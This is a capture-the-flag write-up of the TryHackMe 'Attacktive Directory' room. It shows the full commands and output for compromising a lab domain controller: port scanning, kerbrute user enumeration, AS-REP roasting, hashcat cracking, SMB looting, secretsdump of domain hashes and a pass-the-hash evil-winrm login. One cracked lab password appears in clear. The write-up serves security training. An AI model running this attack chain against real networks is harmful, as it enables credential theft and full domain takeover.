# Attacktive Directory

Link to the room: https://tryhackme.com/room/attacktivedirectory

## Let's start !!

First, we set an IP variable

````````
export IP=10.10.181.198

````````

## Rustscan 

As always we start with rustscan  I like its style and it instantly gives a response after discovering an open port. The drawback is that we cannot scan it for UDP.

````````
rustscan $IP -- -A -sC -sV -oN nmap.txt
````````

````````python
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.181.198:53
Open 10.10.181.198:80
Open 10.10.181.198:88
Open 10.10.181.198:135
Open 10.10.181.198:139
Open 10.10.181.198:445
Open 10.10.181.198:464
Open 10.10.181.198:389
Open 10.10.181.198:593
Open 10.10.181.198:636
Open 10.10.181.198:3268
Open 10.10.181.198:3269
Open 10.10.181.198:3389
Open 10.10.181.198:5985
Open 10.10.181.198:9389
Open 10.10.181.198:47001
Open 10.10.181.198:49664
Open 10.10.181.198:49665
Open 10.10.181.198:49667
Open 10.10.181.198:49669
Open 10.10.181.198:49674
Open 10.10.181.198:49673
Open 10.10.181.198:49672
Open 10.10.181.198:49682
Open 10.10.181.198:49678
Open 10.10.181.198:49695
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -sC -sV -oN nmap.txt -vvv -p 53,80,88,135,139,445,464,389,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49674,49673,49672,49682,49678,49695 10.10.181.198

Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-16 21:11 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:11
Completed NSE at 21:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:11
Completed NSE at 21:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:11
Completed NSE at 21:11, 0.00s elapsed
Initiating Ping Scan at 21:11
Scanning 10.10.181.198 [4 ports]
Completed Ping Scan at 21:11, 0.28s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 21:11
Completed Parallel DNS resolution of 1 host. at 21:11, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 21:11
Scanning 10.10.181.198 [26 ports]
Discovered open port 3389/tcp on 10.10.181.198
Discovered open port 80/tcp on 10.10.181.198
Discovered open port 445/tcp on 10.10.181.198
Discovered open port 135/tcp on 10.10.181.198
Discovered open port 49695/tcp on 10.10.181.198
Discovered open port 53/tcp on 10.10.181.198
Discovered open port 3269/tcp on 10.10.181.198
Discovered open port 139/tcp on 10.10.181.198
Discovered open port 47001/tcp on 10.10.181.198
Discovered open port 5985/tcp on 10.10.181.198
Discovered open port 389/tcp on 10.10.181.198
Discovered open port 636/tcp on 10.10.181.198
Discovered open port 49673/tcp on 10.10.181.198
Discovered open port 49672/tcp on 10.10.181.198
Discovered open port 49669/tcp on 10.10.181.198
Discovered open port 9389/tcp on 10.10.181.198
Discovered open port 593/tcp on 10.10.181.198
Discovered open port 49667/tcp on 10.10.181.198
Discovered open port 49682/tcp on 10.10.181.198
Discovered open port 49665/tcp on 10.10.181.198
Discovered open port 49678/tcp on 10.10.181.198
Discovered open port 49664/tcp on 10.10.181.198
Discovered open port 3268/tcp on 10.10.181.198
Discovered open port 49674/tcp on 10.10.181.198
Discovered open port 88/tcp on 10.10.181.198
Discovered open port 464/tcp on 10.10.181.198
Completed SYN Stealth Scan at 21:11, 0.53s elapsed (26 total ports)
Initiating Service scan at 21:11
Scanning 26 services on 10.10.181.198
Completed Service scan at 21:12, 64.30s elapsed (26 services on 1 host)
Initiating OS detection (try #1) against 10.10.181.198
Retrying OS detection (try #2) against 10.10.181.198
Initiating Traceroute at 21:12
Completed Traceroute at 21:12, 0.25s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 21:12
Completed Parallel DNS resolution of 2 hosts. at 21:12, 0.06s elapsed
DNS resolution of 2 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.181.198.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:12
Completed NSE at 21:13, 11.31s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:13
Completed NSE at 21:13, 8.09s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Nmap scan report for 10.10.181.198
Host is up, received echo-reply ttl 127 (0.25s latency).
Scanned at 2022-05-16 21:11:41 IST for 88s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-05-16 15:41:49Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2022-05-16T15:43:02+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-05-15T15:40:19
| Not valid after:  2022-11-14T15:40:19
| MD5:   1702 e39d 8e9a c8e6 37e9 cc9c 19c6 e356
| SHA-1: f0fc 0366 abc7 f448 7842 9623 c1e3 ec02 0ec4 f7a4
| -----BEGIN CERTIFICATE-----
| MIIDCjCCAfKgAwIBAgIQJyK2CCqMXLVNdgakeCdfNTANBgkqhkiG9w0BAQsFADAu
| MSwwKgYDVQQDEyNBdHRhY2t0aXZlRGlyZWN0b3J5LnNwb29reXNlYy5sb2NhbDAe
| Fw0yMjA1MTUxNTQwMTlaFw0yMjExMTQxNTQwMTlaMC4xLDAqBgNVBAMTI0F0dGFj
| a3RpdmVEaXJlY3Rvcnkuc3Bvb2t5c2VjLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEF
| AAOCAQ8AMIIBCgKCAQEA981fkesKrG/LwBPJ4dl7omSjCxQiO8kY1Cby7cHEUbg1
| 3zSFHFq77Rdzcdsc3k8RQfoWJ/mgMQo4Ebr9trQx0x17Q/yVCgQcgIsId822NxYv
| +u3mjRo5WqaHl3gepSkeuQxPH3w1DlObSZ5twVoFJDp5heizKvGy5DzuOdNenkig
| rZnWifUvVpkzxOOZuZe6S7IYjSqN5NXYYKwL2ZBwgkNtfgaDbqlWPj/wwIuUOvLm
| RjFMYqOZ1YlJIb+BxNKGi17gyNL2rliQ/TAESDVNuJuxmltMa2URXJwjRlplyf6x
| xJo1qQAg/xJJbVwVJAkAb4ALlI2zV1E7y7p1yAPo1QIDAQABoyQwIjATBgNVHSUE
| DDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKYn
| ErPQREDZte9DlMN1OBOPEVzJ1uL90ozczYkQVkaoW9lE05/KDsIGHK/u5HwZUBHV
| 04TIPMsDE4yZ5/z9+pPOPKBGPDW0BGi6yh7s+1G6XDPz2yucCmyXdpqUWjJRSnMP
| RS3J9I1fXrAU6zPLRAU/zLFBZ4AV7KstfsJVCXJnez+CVJIJUj/WfNe5LJE+Y4ao
| ebgr+cJfc2Uy/LKomPraqFLlCQCe31xfsGDAcAmNqsSegAwWsG+fLuvlSXxSMh72
| HAlewUohKVwFz+jmfjB39xgIlo+heAzK753HlXcTpblrIcGc0SFBlPqaEFQ2HZ87
| 8PUMtSxysGlQ64O9H/k=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2022-05-16T15:42:54+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49672/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=5/16%OT=53%CT=%CU=33765%PV=Y%DS=2%DC=T%G=N%TM=6282710D%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=U)
OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%O6=M505NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%T=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32850/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 19138/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 46675/udp): CLEAN (Failed to receive data)
|   Check 4 (port 64497/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2022-05-16T15:42:52
|_  start_date: N/A

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   249.90 ms 10.8.0.1
2   250.43 ms 10.10.181.198

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.45 seconds
           Raw packets sent: 72 (4.572KB) | Rcvd: 71 (4.276KB)

````````
I have tried to log in to the SMB with anonymous access but it failed because it does not have any guest users enabled. so we can brute force for username by using kerbrute. you can get the user list and the password list from its page.

## kerbrute

````````
./kerbrute_linux_amd64 userenum -d spookysec.local --dc $IP userlist.txt
````````

````````python
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/16/22 - Ronnie Flathers @ropnop

2022/05/16 21:15:50 >  Using KDC(s):
2022/05/16 21:15:50 >  	10.10.181.198:88

2022/05/16 21:15:51 >  [+] VALID USERNAME:	 james@spookysec.local
2022/05/16 21:15:55 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2022/05/16 21:16:01 >  [+] VALID USERNAME:	 James@spookysec.local
2022/05/16 21:16:03 >  [+] VALID USERNAME:	 robin@spookysec.local
2022/05/16 21:16:24 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2022/05/16 21:16:38 >  [+] VALID USERNAME:	 administrator@spookysec.local
2022/05/16 21:17:07 >  [+] VALID USERNAME:	 backup@spookysec.local
2022/05/16 21:17:19 >  [+] VALID USERNAME:	 paradox@spookysec.local
2022/05/16 21:18:43 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2022/05/16 21:19:12 >  [+] VALID USERNAME:	 Robin@spookysec.local

````````
so we have some valid user names I have tried all of them and succeeded with only one which is svc-admin.

## Kerberosting

 let's do some Kerberosting Attack.

````````
GetNPUsers.py  spookysec.local/svc-admin -dc-ip $IP -no-pass -request
````````

````````python
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:{REDACTED}

````````
nice, we got our Kerberos hash. let's find the hashcat mode for it and crack it.

## Name-That-Hash

for finding what kind of hash is it and its mode we use a tool called name-that-hash aka nth.

````````
nth -f hash.txt 
````````

````````python
                                                              
  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|

https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 
    

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:{REDACTED}

Most Likely 
Kerberos 5 AS-REP etype 23, HC: 18200 JtR: krb5pa-sha1 Summary: Used for Windows Active Directory


````````
so we have find the mode and the hash type let's use hashcat and cracked that shit....

## Hashcat

````````
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
````````

````````python
hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD Ryzen 5 3500 6-Core Processor, 2904/5873 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:{REDACTED}:{REDACTED}
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:49cf97967c5...aa415d
Time.Started.....: Mon May 23 23:11:30 2022, (4 secs)
Time.Estimated...: Mon May 23 23:11:34 2022, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1576.9 kH/s (0.72ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5838848/14344385 (40.70%)
Rejected.........: 0/5838848 (0.00%)
Restore.Point....: 5836800/14344385 (40.69%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: manaiagal -> mamuelito1
Hardware.Mon.#1..: Util: 62%

Started: Mon May 23 23:11:28 2022
Stopped: Mon May 23 23:11:35 2022

````````
YEA!! we have cracked the hash. what next?  let's do some more enumeration. remember we did not have access to SMB let's go into the assembly and check what's in there

## SMB (smbmap,smbclient)

````````
smbmap -u svc-admin -p management2005 -H $IP
````````

````````python
[+] IP: 10.10.181.198:445	Name: 10.10.181.198                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backup                                            	READ ONLY	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 

````````
ok, we have read-only access to the backup folder let's see what's inside.

### smbclient

````````
smbclient  \\\\$IP\\backup -U svc-admin
````````

````````python    
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> 

````````
we found in a text file. its content is encrypted with base64 let's decode it and see what is it.

## backup_credentials

backup_credentials.txt > {REDACTED}

### Decode

````````
echo "{REDACTED}" | base64 -d
````````

````````python
backup@spookysec.local:{REDACTED}                                                                                                                                                          
````````
YESSS!!. it's the username and password of the user backup.

let's 3 if we can dump the ntds with the help of secretsdump by the credential.

## secretsdump

````````
secretsdump.py spookysec.local/backup:{REDACTED}@10.10.181.198
````````

````````python
Impacket v0.10.1.dev1+20220504.120002.d5097759 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:{REDACTED}:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:{REDACTED}
Administrator:aes128-cts-hmac-sha1-96:{REDACTED}
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:{REDACTED}
krbtgt:aes128-cts-hmac-sha1-96:{REDACTED}
krbtgt:des-cbc-md5:{REDACTED}
spookysec.local\skidy:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\skidy:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\skidy:des-cbc-md5:{REDACTED}
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\james:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\james:des-cbc-md5:{REDACTED}
spookysec.local\optional:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\optional:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\optional:des-cbc-md5:{REDACTED}
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\sherlocksec:des-cbc-md5:{REDACTED}
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\darkstar:des-cbc-md5:{REDACTED}
spookysec.local\Ori:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\Ori:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\Ori:des-cbc-md5:{REDACTED}
spookysec.local\robin:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\robin:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\robin:des-cbc-md5:{REDACTED}
spookysec.local\paradox:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\paradox:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\Muirland:des-cbc-md5:{REDACTED}
spookysec.local\horshark:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\horshark:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\horshark:des-cbc-md5:{REDACTED}
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\svc-admin:des-cbc-md5:{REDACTED}
spookysec.local\backup:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\backup:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\backup:des-cbc-md5:{REDACTED}
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:{REDACTED}
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:{REDACTED}
spookysec.local\a-spooks:des-cbc-md5:{REDACTED}
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:{REDACTED}
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:{REDACTED}
ATTACKTIVEDIREC$:des-cbc-md5:{REDACTED}
[*] Cleaning up... 

````````
we have successfully dump the ntds now we can log in as administrator and get those flags...

## Evil-winrm 

````````
evil-winrm -u Administrator -H {REDACTED} -i $IP
````````

````````python
Evil-WinRM shell v3.3

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
{REDACTED}
*Evil-WinRM* PS C:\Users\Administrator\Documents>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../../svc-admin/Desktop/user.txt.txt
{REDACTED}
*Evil-WinRM* PS C:\Users\Administrator\Documents>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../../backup/Desktop/PrivEsc.txt
{REDACTED}

````````
-DONE
